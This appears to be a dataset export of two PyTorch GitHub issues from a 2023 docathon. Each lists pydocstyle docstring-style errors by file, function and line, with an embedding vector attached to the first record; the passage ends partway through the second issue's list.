"Fix docstring errors in gradcheck.py, forward_ad.py, profiler_util.py, profiler_legacy.py, functional.py, grad_mode.py, function.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `enter_dual_level`, **Line**: 15, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `enter_dual_level`, **Line**: 15, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `exit_dual_level`, **Line**: 32, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `exit_dual_level`, **Line**: 32, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `make_dual`, **Line**: 50, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `make_dual`, **Line**: 50, **Description**: First line should end with a period (not 'a')
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `UnpackedDualTensor`, **Line**: 109, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `UnpackedDualTensor`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `UnpackedDualTensor`, **Line**: 109, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `unpack_dual`, **Line**: 115, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `dual_level`, **Line**: 146, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `dual_level`, **Line**: 146, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `dual_level`, **Line**: 146, **Description**: First line should end with a period (not 't')
- **File**: `torch/autograd/functional.py`, **Entity**: `vjp`, **Line**: 218, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/functional.py`, **Entity**: `vjp`, **Line**: 218, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/functional.py`, **Entity**: `vjp`, **Line**: 218, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/functional.py`, **Entity**: `vjp`, **Line**: 218, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/functional.py`, **Entity**: `jvp`, **Line**: 309, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/functional.py`, **Entity**: `jvp`, **Line**: 309, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/functional.py`, **Entity**: `jvp`, **Line**: 309, **Description**: First line should end with a period (not 'f')
- **File**: `torch/autograd/functional.py`, **Entity**: `jvp`, **Line**: 309, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/functional.py`, **Entity**: `jacobian`, **Line**: 500, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/functional.py`, **Entity**: `hessian`, **Line**: 714, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/functional.py`, **Entity**: `hessian`, **Line**: 714, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/functional.py`, **Entity**: `vhp`, **Line**: 832, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/functional.py`, **Entity**: `vhp`, **Line**: 832, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/functional.py`, **Entity**: `vhp`, **Line**: 832, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/functional.py`, **Entity**: `vhp`, **Line**: 832, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/functional.py`, **Entity**: `hvp`, **Line**: 925, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/functional.py`, **Entity**: `hvp`, **Line**: 925, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/functional.py`, **Entity**: `hvp`, **Line**: 925, **Description**: First line should end with a period (not 'r')
- **File**: `torch/autograd/functional.py`, **Entity**: `hvp`, **Line**: 925, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `profile`, **Line**: 19, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `profile`, **Line**: 19, **Description**: First line should end with a period (not 'd')
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `self_cpu_time_total`, **Line**: 155, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `self_cpu_time_total`, **Line**: 155, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `self_cpu_time_total`, **Line**: 155, **Description**: First line should end with a period (not 'f')
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `_get_record_key`, **Line**: 165, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `_get_record_key`, **Line**: 165, **Description**: First line should end with a period (not 'd')
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `_get_record_key`, **Line**: 165, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `GradcheckError`, **Line**: 19, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `GradcheckError`, **Line**: 19, **Description**: First line should end with a period (not '`')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_numerical_jacobian`, **Line**: 192, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_numerical_jacobian`, **Line**: 192, **Description**: First line should end with a period (not 'f')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_numerical_jacobian`, **Line**: 192, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `get_numerical_jacobian`, **Line**: 229, **Description**: First line should be in imperative mood; try rephrasing (found 'Deprecated')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_analytical_jacobian_forward_ad`, **Line**: 384, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_analytical_jacobian_forward_ad`, **Line**: 384, **Description**: First line should end with a period (not 't')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_analytical_jacobian_forward_ad`, **Line**: 384, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `gradcheck`, **Line**: 1449, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `gradcheck`, **Line**: 1449, **Description**: First line should end with a period (not 'l')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `gradgradcheck`, **Line**: 1606, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `gradgradcheck`, **Line**: 1606, **Description**: First line should end with a period (not 's')
- **File**: `torch/autograd/function.py`, **Entity**: `save_for_backward`, **Line**: 19, **Description**: First line should be in imperative mood (perhaps 'Save', not 'Saves')
- **File**: `torch/autograd/function.py`, **Entity**: `save_for_forward`, **Line**: 78, **Description**: First line should be in imperative mood (perhaps 'Save', not 'Saves')
- **File**: `torch/autograd/function.py`, **Entity**: `mark_dirty`, **Line**: 130, **Description**: First line should be in imperative mood (perhaps 'Mark', not 'Marks')
- **File**: `torch/autograd/function.py`, **Entity**: `mark_non_differentiable`, **Line**: 173, **Description**: First line should be in imperative mood (perhaps 'Mark', not 'Marks')
- **File**: `torch/autograd/function.py`, **Entity**: `set_materialize_grads`, **Line**: 205, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/autograd/function.py`, **Entity**: `FunctionMeta`, **Line**: 282, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `forward`, **Line**: 299, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `forward`, **Line**: 299, **Description**: First line should end with a period (not 's')
- **File**: `torch/autograd/function.py`, **Entity**: `forward`, **Line**: 299, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/autograd/function.py`, **Entity**: `backward`, **Line**: 360, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `backward`, **Line**: 360, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/function.py`, **Entity**: `backward`, **Line**: 360, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/autograd/function.py`, **Entity**: `jvp`, **Line**: 390, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `jvp`, **Line**: 390, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/function.py`, **Entity**: `jvp`, **Line**: 390, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/autograd/function.py`, **Entity**: `Function`, **Line**: 411, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `Function`, **Line**: 411, **Description**: First line should end with a period (not '`')
- **File**: `torch/autograd/function.py`, **Entity**: `vmap`, **Line**: 472, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `vmap`, **Line**: 472, **Description**: First line should end with a period (not 'h')
- **File**: `torch/autograd/function.py`, **Entity**: `vmap`, **Line**: 472, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/autograd/function.py`, **Entity**: `traceable`, **Line**: 562, **Description**: First line should be in imperative mood (perhaps 'Mark', not 'Marks')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `EventList`, **Line**: 17, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `EventList`, **Line**: 17, **Description**: First line should end with a period (not ')')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_populate_cpu_children`, **Line**: 56, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_populate_cpu_children`, **Line**: 56, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_populate_cpu_children`, **Line**: 56, **Description**: First line should be in imperative mood (perhaps 'Populate', not 'Populates')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `table`, **Line**: 161, **Description**: First line should be in imperative mood (perhaps 'Print', not 'Prints')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `export_chrome_trace`, **Line**: 191, **Description**: First line should be in imperative mood (perhaps 'Export', not 'Exports')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_time`, **Line**: 318, **Description**: First line should end with a period (not 't')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_time`, **Line**: 318, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_time_share`, **Line**: 328, **Description**: First line should end with a period (not 't')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_time_share`, **Line**: 328, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_memory`, **Line**: 335, **Description**: First line should end with a period (not 'g')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_memory`, **Line**: 335, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `FormattedTimesMixin`, **Line**: 353, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `FunctionEvent`, **Line**: 386, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `set_cpu_parent`, **Line**: 433, **Description**: First line should end with a period (not 't')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `FunctionEventAvg`, **Line**: 536, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `MemRecordsAcc`, **Line**: 624, **Description**: First line should end with a period (not 'l')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_build_table`, **Line**: 692, **Description**: First line should be in imperative mood (perhaps 'Print', not 'Prints')
- **File**: `torch/autograd/grad_mode.py`, **Entity**: `no_grad`, **Line**: 10, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/grad_mode.py`, **Entity**: `enable_grad`, **Line**: 70, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/grad_mode.py`, **Entity**: `inference_mode`, **Line**: 173, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/grad_mode.py`, **Entity**: `inference_mode`, **Line**: 173, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/grad_mode.py`, **Entity**: `_unsafe_preserve_version_counter`, **Line**: 302, **Description**: First line should end with a period (not '!')

cc @carljparker",False,"[-1.26495242e-01 -2.35854924e-01 -5.07258400e-02 -2.47753203e-01
  2.64481634e-01 -8.88067335e-02 -1.84491009e-01  2.84984279e-02
 -3.72460723e-01  5.85724115e-02 -2.42206547e-02  3.50003168e-02
  2.65050810e-02  1.93557203e-01 -5.79718407e-03  2.14349534e-02
 -3.41879129e-01 -4.11044329e-01  4.02852058e-01  5.56391515e-02
  1.72519147e-01  4.59174693e-01 -4.39709350e-02  2.28586271e-02
 -2.67088592e-01 -5.24860295e-03 -2.70890713e-01 -1.76133454e-01
  7.72817507e-02  4.89204414e-02  4.32628214e-01  3.01011622e-01
 -2.46682942e-01  4.04147208e-02  3.70750397e-01  4.13544476e-01
 -8.04634094e-02 -2.34993011e-01 -4.30714339e-02  7.34504461e-02
 -2.28127129e-02 -1.63187712e-01 -1.49338394e-01 -4.68283668e-02
  2.38284588e-01 -2.56291389e-01 -5.14493398e-02  1.39353707e-01
 -1.25514805e-01  8.62193927e-02  3.94566096e-02  2.09234878e-02
 -1.98857740e-01  1.24648876e-01  2.20804065e-01  1.85143888e-01
 -9.44758952e-02  6.32905364e-01 -1.33680850e-01 -6.54051527e-02
  1.16478734e-01  2.31323868e-01 -2.73128152e-01  1.08522221e-01
 -9.06961560e-02  2.98133492e-01  1.16849467e-01  4.06220481e-02
  4.01583612e-01  1.05764255e-01 -2.82848597e-01 -4.10660449e-03
 -3.74353379e-01 -2.59450078e-01  1.00612789e-01  4.14329529e-01
 -3.72828901e-01 -6.80070445e-02 -1.82051852e-01 -2.63923466e-01
 -1.11408696e-01 -1.38205960e-02  8.18763003e-02  1.20777704e-01
 -2.43973061e-02 -1.92358315e-01  2.12903813e-01 -2.12018073e-01
  2.71592796e-01  2.56597310e-01  5.04850745e-01 -4.71697509e-01
 -5.72991557e-04  3.47758234e-01  1.48061022e-01  2.81073689e-01
 -2.18612462e-01 -4.40314710e-02  1.39217868e-01 -1.32830098e-01
  7.04794079e-02 -3.06391537e-01  1.76595040e-02  3.07906836e-01
 -1.06528094e-02 -1.23129278e-01  1.61218435e-01  6.01762980e-02
  2.57162243e-01  1.18663050e-02 -4.50831745e-03 -1.38399854e-01
  2.50523001e-01  1.51530311e-01  4.11434203e-01  5.48333451e-02
 -3.69979858e-01  1.94388647e-02 -1.36210054e-01  3.96594703e-02
  1.98188156e-01  2.50976205e-01  1.45830691e-01 -1.05149232e-01
 -3.27109322e-02  7.65272081e-02  1.26116991e-01 -5.84643558e-02
  1.55742139e-01 -2.28375435e-01  2.26020232e-01 -1.50724426e-02
 -5.75295649e-02  1.45229936e-01  1.96201503e-01  1.03336602e-01
 -1.29458755e-01 -2.85732388e-01  3.14406157e-02 -1.31540403e-01
 -2.79247165e-01 -3.92831922e-01 -2.36448660e-01 -8.16265866e-02
  9.58555415e-02  3.60950261e-01 -2.45066553e-01  4.83823717e-01
  2.95250472e-02  1.77724138e-02 -3.62855010e-02  3.85727361e-02
 -2.60403484e-01  5.19581556e-01  1.08670652e-01  2.50790477e-01
  4.33172464e-01 -8.13338831e-02 -1.14860132e-01 -2.58154541e-01
  5.00507690e-02  1.71822518e-01 -3.92639227e-02 -9.64914188e-02
 -2.20975220e-01  1.51332915e-01 -6.54246211e-02 -1.79708332e-01
 -2.27101550e-01 -1.17503732e-01  7.27666691e-02  2.14625180e-01
  8.58632848e-03 -1.12337708e-01  2.34309509e-01  1.72856376e-02
 -6.65919334e-02 -3.57567549e-01  2.47008093e-02  2.35045210e-01
 -1.13117114e-01  4.55039084e-01  3.58478427e-02 -3.71828228e-02
 -1.94679499e-01  1.29989937e-01  1.70907557e-01 -2.21322641e-01
  2.63561785e-01  4.35979754e-01  1.93444937e-01 -2.61510730e-01
  1.55539572e-01  9.93660837e-03 -2.79626787e-01 -1.09155037e-01
  3.31409425e-01  6.17553174e-01  9.33141168e-03  2.90715754e-01
 -1.18924476e-01  2.03894615e-01  3.19327205e-01 -4.70688194e-02
  3.58142316e-01 -1.08653516e-01 -3.83366257e-01 -1.86723754e-01
 -1.67085111e-01 -2.31351405e-02 -3.91387343e-01 -1.56128183e-01
  2.67638247e-02 -1.37522534e-01 -3.32430959e-01  2.02588633e-01
  1.86800450e-01 -2.76910126e-01  2.68920332e-01 -1.37751639e-01
 -3.21628720e-01  6.80814758e-02 -2.28535429e-01 -2.83355296e-01
  3.88411999e-01  1.19778298e-01 -7.22508281e-02 -9.44540873e-02
 -1.30793452e-03 -6.38927892e-02  3.08329128e-02  1.28056496e-01
  5.71577609e-01 -2.03086346e-01  1.10995904e-01  6.32243901e-02
 -4.62852195e-02 -7.63436109e-02  1.24259219e-01  1.94697216e-01
 -2.04525262e-01 -1.11085609e-01 -2.91072130e-02 -1.29896896e-02
  2.64699578e-01 -3.01711917e-01 -3.39336038e-01 -5.36492355e-02
 -3.20336103e-01  1.99883468e-02 -3.00282165e-02 -3.18477660e-01
  1.20584399e-01 -3.66743505e-02  6.63347244e-01  1.28195420e-01
 -3.59344393e-01 -2.26618219e-02 -5.72878346e-02  9.74525213e-02
 -5.80646023e-02  3.31831276e-01 -9.63962376e-02  1.44496441e-01
  3.98862600e-01 -1.05787769e-01 -2.83045292e-01 -1.53564140e-02
  1.67169049e-01 -1.75454378e-01  9.19732973e-02 -6.72614098e-01
  4.48326945e-01  1.78262323e-01  3.56814355e-01  8.15257207e-02
  3.78363937e-01 -5.76163530e-02  1.59222186e-01 -7.58233666e-03
 -1.73954308e-01  4.21301186e-01 -3.99254024e-01 -2.06467956e-01
  2.03401089e-01 -2.07947530e-02 -3.52056623e-02 -1.71702340e-01
 -5.63603759e-01 -1.58044979e-01 -1.45926490e-01  1.71491608e-01
  4.21490937e-01  4.13281471e-02 -1.95010137e-02  7.96760172e-02
 -3.58345583e-02  2.84743071e-01  3.08569908e-01 -1.57008134e-02
 -5.40759683e-01 -1.74600258e-01 -7.13808164e-02  3.29788566e-01
  9.33484957e-02  1.53047398e-01  5.98947555e-02  7.19922334e-02
  4.45762388e-02 -3.53314966e-01  3.27666670e-01  4.17438567e-01
 -3.10340136e-01  1.35239929e-01  4.66325581e-02  4.36354391e-02
 -1.56906366e-01  4.53841627e-01  1.72370613e-01 -1.73315629e-02
 -7.42874816e-02 -4.55946386e-01 -2.89716661e-01 -8.48675147e-03
 -4.17232979e-03 -1.91765651e-02 -4.06550527e-01 -6.81142658e-02
 -2.32648432e-01 -5.21772206e-01  1.71275690e-01  1.25391081e-01
 -1.84155375e-01 -5.55407852e-02 -2.97630914e-02  1.47253960e-01
 -3.45900327e-01  2.14861795e-01  1.08170044e-02 -3.15106988e-01
  9.45396535e-03 -1.45041600e-01  7.40787312e-02 -6.50462151e-01
 -1.15618885e-01  9.72399116e-03  1.21824019e-01  2.80791491e-01
 -5.63321948e-01 -3.68818790e-01  4.43541288e-01  2.57103480e-02
 -2.93786705e-01 -1.48573428e-01  3.25995311e-02  3.25508803e-01
  1.67253017e-02  1.39113635e-01  6.43759966e-04  4.78819549e-01
 -5.30946374e-01 -7.23197535e-02 -4.61209416e-02 -3.47248435e-01
 -1.18218698e-01 -2.93355554e-01 -1.52671814e-01  1.04955465e-01
  2.52136350e-01 -8.30572844e-02 -2.28628173e-01  2.15585783e-01
 -2.17619389e-01  2.04924881e-01  3.36459845e-01  1.89276427e-01
  6.21712916e-02 -2.92163976e-02  7.37571046e-02 -3.67603779e-01
 -3.83594781e-01  1.70027554e-01  5.17942190e-01 -3.13429296e-01]"
"Fix docstring errors in adagrad.py, asgd.py, sparse_adam.py, adam.py, adamax.py, grad_scaler.py, adamw.py, random.py, _functional.py, lbfgs.py, adadelta.py, __init__.py, autocast_mode.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/cuda/random.py`, **Entity**: `get_rng_state`, **Line**: 13, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/random.py`, **Entity**: `get_rng_state_all`, **Line**: 35, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/random.py`, **Entity**: `get_rng_state_all`, **Line**: 35, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/random.py`, **Entity**: `set_rng_state`, **Line**: 44, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `set_rng_state_all`, **Line**: 69, **Description**: Docstring is over-indented
- **File**: `torch/cuda/random.py`, **Entity**: `set_rng_state_all`, **Line**: 69, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/random.py`, **Entity**: `set_rng_state_all`, **Line**: 69, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `set_rng_state_all`, **Line**: 69, **Description**: Section has no content ('Args')
- **File**: `torch/cuda/random.py`, **Entity**: `manual_seed`, **Line**: 78, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/random.py`, **Entity**: `manual_seed`, **Line**: 78, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `manual_seed_all`, **Line**: 100, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/random.py`, **Entity**: `manual_seed_all`, **Line**: 100, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `seed`, **Line**: 118, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/random.py`, **Entity**: `seed`, **Line**: 118, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `seed_all`, **Line**: 135, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/random.py`, **Entity**: `seed_all`, **Line**: 135, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `initial_seed`, **Line**: 155, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `autocast`, **Line**: 14, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_fwd`, **Line**: 75, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_fwd`, **Line**: 75, **Description**: First line should end with a period (not 'f')
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_fwd`, **Line**: 75, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_bwd`, **Line**: 114, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_bwd`, **Line**: 114, **Description**: First line should end with a period (not 'f')
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_bwd`, **Line**: 114, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `_MultiDeviceReplicator`, **Line**: 14, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `_MultiDeviceReplicator`, **Line**: 14, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `step`, **Line**: 294, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `update`, **Line**: 381, **Description**: First line should be in imperative mood (perhaps 'Update', not 'Updates')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_scale`, **Line**: 449, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_growth_factor`, **Line**: 461, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_growth_factor`, **Line**: 461, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_growth_factor`, **Line**: 467, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_growth_factor`, **Line**: 467, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_backoff_factor`, **Line**: 474, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_backoff_factor`, **Line**: 474, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_backoff_factor`, **Line**: 480, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_backoff_factor`, **Line**: 480, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_growth_interval`, **Line**: 487, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_growth_interval`, **Line**: 487, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_growth_interval`, **Line**: 493, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_growth_interval`, **Line**: 493, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `is_enabled`, **Line**: 506, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `is_enabled`, **Line**: 506, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `state_dict`, **Line**: 512, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `state_dict`, **Line**: 512, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `load_state_dict`, **Line**: 534, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **File**: `torch/optim/_functional.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **File**: `torch/optim/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/optim/lbfgs.py`, **Entity**: `LBFGS`, **Line**: 185, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/optim/lbfgs.py`, **Entity**: `LBFGS`, **Line**: 185, **Description**: First line should end with a period (not 'c')
- **File**: `torch/optim/lbfgs.py`, **Entity**: `step`, **Line**: 285, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/sparse_adam.py`, **Entity**: `step`, **Line**: 40, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adadelta.py`, **Entity**: `step`, **Line**: 79, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adadelta.py`, **Entity**: `adadelta`, **Line**: 188, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/optim/adagrad.py`, **Entity**: `step`, **Line**: 102, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adagrad.py`, **Entity**: `adagrad`, **Line**: 201, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/optim/adam.py`, **Entity**: `step`, **Line**: 124, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adam.py`, **Entity**: `adam`, **Line**: 267, **Description**: No blank lines allowed after function docstring (found 1)
